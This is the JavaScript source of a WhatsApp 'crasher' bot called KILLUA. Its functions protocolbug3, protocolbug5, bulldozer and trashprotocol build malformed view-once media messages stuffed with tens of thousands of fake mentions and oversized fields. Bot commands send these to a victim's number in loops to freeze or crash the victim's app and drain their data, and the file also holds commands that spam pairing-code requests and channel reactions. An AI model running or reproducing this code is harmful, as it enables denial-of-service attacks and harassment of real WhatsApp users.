/*
┏━━━━━━━━━━━━━━━┓
┃ CRASHER BASE - WHATSAPP 
┣━━━━━━━━━━━━━━━┛
┃♕ Creator: KILLUA
┃♕ AI Helper: ChatGPT
┃♔ Version: 2.0.0 
┗━━━━━━━━━━━━━━━┛
*/
//========BASE BY TAMA========
require('./config')
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs-extra')
const util = require('util')
const chalk = require('chalk')
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
//===============
module.exports = rikz = async (rikz, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = q = args.join(" ")//hard
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = await rikz.decodeJid(rikz.user.id);
const premuser = JSON.parse(fs.readFileSync("./system/database/premium.json"));
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!rikz.public && !isCreator) return;
//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await rikz.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
//======================
if (m.message) {
rikz.readMessages([m.key]);
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold("📩 NEW MESSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Dari:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
//FUNCTION BUG
//protocol 3
async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
    }
    //protocol5
    async function protocolbug5(isTarget, mention) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Tama Ryuchi" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝐁𝐀𝐍𝐆 𝐃𝐈𝐊𝐙𝐙‌ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
//buldozer
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await rikz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
  
//trashprotocol
  async function trashprotocol(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 2000000)}@s.whatsapp.net`
        )
    ];

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        annotations: [],
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k="
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
console.log(chalk.green(`Send Bug By Proxy-free🐉 : ${target}`));
}
//======================
switch (command) {
//case bug
case "delay-invis1": {

if (!isPremium) return m.reply('Khusus Premium kak');

if (!text) return m.reply(`\`Example:\` : ${prefix+command} 243×××`);

target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

m.reply(`bug ${prefix+command} envoyé avec succès au numéro de destination. *minimum 5 minute pause*`); 

          for (let i = 0; i < 35; i++) {

            await protocolbug3(target);

            await sleep(1500);

            await protocolbug3(target);

            await protocolbug3(target);

            await sleep(2000);

            await protocolbug3(target);

            await protocolbug3(target);

            await sleep(1500);

            await protocolbug3(target);

}

    }

  

break;
//======================
case "delay-invis2": {
    
if (!isPremium) return m.reply('Khusus Premium kak');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 243×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} envoyé avec succès au numéro de destination. *minimum 5 minute pause*`); 
          for (let i = 0; i < 35; i++) {
            await protocolbug5(target);
            await sleep(1500);
            await protocolbug5(target);
            await protocolbug5(target);
            await sleep(2000);
            await protocolbug5(target);
            await protocolbug5(target);
            await sleep(1500);
            await protocolbug5(target);
}
    }
  
break;
//======================
case "delay-invis3": {
    
if (!isPremium) return m.reply('Khusus Premium kak');
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 243×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} envoyé avec succès au numéro de destination. *minimum 5 minute pause*`); 
          for (let i = 0; i < 35; i++) {
            await bulldozer(target);
            await sleep(1500);
            await bulldozer(target);
           
}
    }
  
break;
//======================
case "killua-love": {
    
if (!isPremium) return m.reply('Khusus Premium kak');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 243×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} envoyé avec succès au numéro de destination. *minimum 5 minute pause*`); 
          for (let i = 0; i < 35; i++) {
            await trashprotocol(target);
            await sleep(1500);
            await trashprotocol(target);
            await trashprotocol(target);
            await sleep(2000);
            await trashprotocol(target);
            await trashprotocol(target);
            await sleep(1500);
            await trashprotocol(target);
}
    }
  
break;
//======================
case 'public': {
if (!isCreator) return m.reply(mess.owner) 
if (rikz.public === true) return m.reply("Udah di public tadi kak🥰");
rikz.public = true
m.reply(mess.succes)
}
break
//======================
case 'self': {
if (!isCreator) return m.reply(mess.owner) 
if (rikz.public === false) return m.reply("Udah di  self tadi kak🥰");
rikz.public = false
m.reply(mess.succes)
}
break
//======================
case "killua": case "killua": {
let itsmenu = 
`𝑆𝑎𝑙𝑢𝑡 À 𝑉𝑜𝑢𝑠  ${m.pushName}
𝐽𝑒 𝑆𝑢𝑖𝑠 𝑇𝑒𝑙𝑙𝑒𝑚𝑒𝑛𝑡 𝑅𝑎𝑣𝑖𝑒 𝐸𝑛𝑣𝑜𝑦𝑎𝑛𝑡 𝑄𝑢𝑒 𝑉𝑜𝑢𝑠 𝐴𝑣𝑒𝑧 𝐵𝑒𝑠𝑜𝑖𝑛 𝐷𝑒 𝑀𝑜𝑖 𝐽𝑒 𝑆𝑢𝑖𝑠  ${global.namabot} 🇨🇩🫵🏽
𝐽𝑒 𝑆𝑒𝑟𝑎𝑖 À 𝑉𝑜𝑠 𝐷𝑖𝑠𝑝𝑜𝑠𝑖𝑡𝑖𝑜𝑛𝑠 𝐶𝑎𝑟 Ç𝑎 𝑀𝑒 𝐹𝑎𝑖𝑡 𝑇𝑒𝑙𝑙𝑒𝑚𝑒𝑛𝑡 𝑀𝑎𝑙 𝐷𝑒 𝑉𝑜𝑢𝑠 𝑉𝑜𝑖𝑟 𝑆𝑜𝑢𝑓𝑓𝑟𝑖𝑟 𝐷𝑎𝑛𝑠 𝐿'𝑎𝑚𝑜𝑢𝑟 𝑀𝑎𝑖𝑠 𝑆𝑖 𝑇𝑢 𝑆𝑒𝑟𝑎𝑠 𝐷'𝑎𝑐𝑐𝑜𝑟𝑑 𝑇𝑢 𝑃𝑒𝑢𝑥 𝐸𝑠𝑠𝑎𝑦𝑒𝑟 𝐷𝑒 𝑇'𝑎𝑚𝑢𝑠𝑒𝑟 𝐴𝑣𝑒𝑐 𝐴𝑣𝑒𝑐 𝐿𝑒 𝐶𝑜𝑚𝑝𝑡𝑒 𝐷𝑒 𝑇𝑒𝑠 𝐸𝑥 𝐸𝑡 𝑇𝑒𝑠 𝐸𝑛𝑛𝑒𝑚𝑖𝑠 É𝑐𝑟𝑖𝑡 𝑆𝑒𝑢𝑙𝑒𝑚𝑒𝑛𝑡 𝐶𝑒 𝑄𝑢𝑒 𝑇𝑢 𝑉𝑜𝑖𝑠 𝐸𝑛 𝐷𝑒𝑠𝑠𝑜𝑢𝑠 𝐷𝑢 𝐵𝑜𝑡👇🏾

【 𝑲𝑰𝑳𝑳𝑼𝑨 𝑪𝑹𝑨𝑺𝑯❀ᴳ ᴱ ᴺ ²  】
➢ Dev : 𝐾𝐼𝐿𝐿𝑈𝐴
➢ Version bot : 1 Gen2
➢ Type bot : Case 
➢ Menu bot : simple Bot bug
╰══════════════════╯

══════════════════
❑ 「 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 」 ❒
├⛃⃟┃${prefix}→ 𝚊𝚍𝚍𝚘𝚠𝚗
├⛃⃟┃${prefix}→ 𝚊𝚍𝚍𝚙𝚛𝚎𝚖
├⛃⃟┃ ${prefix}→ 𝚍𝚎𝚕𝚘𝚠𝚗
├⛃⃟┃ ${prefix}→ 𝚍𝚎𝚕𝚙𝚛𝚎𝚖
├⛃⃟┃${prefix}→ 𝚜𝚎𝚕𝚏
├⛃⃟┃${prefix}→ 𝚙𝚞𝚋𝚕𝚒𝚌
❑ 「 𝐁𝐔𝐆 𝐈𝐍𝐕𝐈𝐒 𝐃𝐄𝐋𝐀𝐘 」 ❒
├⛃⃟┃${prefix}- delay-invis1  
├⛃⃟┃${prefix}- delay-invis2  
├⛃⃟┃${prefix}- delay-invis3 
❑ 「 𝐁𝐔𝐆 𝐋𝐎𝐕𝐄 」 ❒
├⛃⃟┃${prefix}- killua-lovel
❑ 「 𝐒𝐏𝐀𝐌 𝐌𝐔𝐖𝐀𝐍𝐈 」 ❒
├⛃⃟┃${prefix}- 𝚜𝚙𝚊𝚖𝚛𝚎𝚊𝚌𝚝𝚌𝚑
├⛃⃟┃${prefix}- 𝚜𝚙𝚊𝚖𝚙𝚊𝚒𝚛𝚒𝚗𝚐

▣ *_Info Update script?_* ▣
「 https://whatsapp.com/channel/0029VayrkbSAO7RNZKTCHK2U 」

> si l'homme n'a pas une raison de vivre à quoi lui sert de ça liberté 
├⛃⃟┃╰────────────
╰━━━━━━━━━━━━ 
╰━━━━━━━━━━━━ 
`;
await rikz.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/qxjw5r.jpg" },
caption: itsmenu
}, { quoted: m });
}
break; 
//======================
case "addprem": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /addprem (nomor)");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
m.reply(`✅ Added Premium:\n• ${user} (30 days)`)}
break;
//======================
case "delprem": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /delprem (nomor)");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
m.reply(removed ? `✅ Removed Premium:\n• ${user}` : "❌ User tidak ditemukan")}
break;
//======================
case "penyedot-kuota": {
    
if (!isPremium) return m.reply('Khusus Premium');
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 243×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} envoyé avec succès au numéro de destination. *minimum 5 minute pause*`); 
          for (let i = 0; i < 35; i++) {
            await bulldozer(target);
            await sleep(1500);
            await bulldozer(target);
           
}
    }
  
break;
//======================
//case reactch
  case "spamreactch": {

if (!isPremium) return m.reply('Khusus Premium');

if (!text) return m.reply(".spamreactch linkpesan 😂")

if (!args[0] || !args[1]) return m.reply("Wrong Format")

if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")

let result = args[0].split('/')[4]

let serverId = args[0].split('/')[5]

let res = await rikz.newsletterMetadata("invite", result)

await rikz.newsletterReactMessage(res.id, serverId, args[1])

m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)

}

break      
//case spam pair
//======================
case 'spampairing': {
  if (!isPremium) return m.reply('Khusus Premium');
  if (!text) return m.reply(`*Example:* ${prefix + command} 243xxxxxx|150`);
  m.reply('proses...');
  let [peenis, pepekk = "200"] = text.split("|");
  let target = peenis.replace(/[^0-9]/g, '').trim();
  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('pepek');
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");
  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < pepekk; i++) {
    await sleep(1500);
    let prc = await sucked.requestPairingCode(target);
    console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
  }
  await sleep(15000);
}
break;

//======================
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}